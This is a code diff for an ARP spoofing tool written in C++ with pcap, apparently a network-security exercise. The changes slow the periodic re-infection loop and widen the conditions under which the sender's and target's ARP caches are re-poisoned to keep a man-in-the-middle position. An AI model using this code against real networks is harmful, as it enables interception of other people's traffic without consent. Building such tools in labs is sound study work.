@@ -129,7 +129,7 @@ int main(int argc, char *argv[]) {
                             running.store(false);
                             return;
                     }
-                this_thread::sleep_for(chrono::seconds(10));
+                this_thread::sleep_for(chrono::seconds(30));
                 }
 
         }));
@@ -148,8 +148,11 @@ int main(int argc, char *argv[]) {
 
     cout << "Ending process..." << endl;
 
-    for (auto& t : threads) t.join(); //exit thread
-
+    for (auto& t : threads)  //exit thread
+    {
+        if (t.joinable())
+            t.join();
+    }
 
     pcap_close(pcap);
     cout << "Done" << endl;
@@ -287,18 +290,18 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
 
         if (ethhdr->type() == EthHdr::Arp) {
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
-            //sender -> taregt ARP request
-            //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
-            if (ethhdr->smac() == sender_mac && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
+            //sender -> taregt or target -> sender ARP request (broadcast)
+            //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl
+            if ((ethhdr->smac() == sender_mac || ethhdr->smac() == target_mac) && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                         return false;
                     }
-                cout << "infected\n";
+                cout << "case 1 infected\n";
             }
-
-            else if (ethhdr->smac() == target_mac &&  ethhdr->dmac() == attack_mac && arp_pkt->op()   == ArpHdr::Reply ) {
+            //sender -> target unicast
+            else if (ethhdr->smac() == sender_mac && ethhdr->dmac() == target_mac && arp_pkt->op() == ArpHdr::Reply ) {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                     return false;
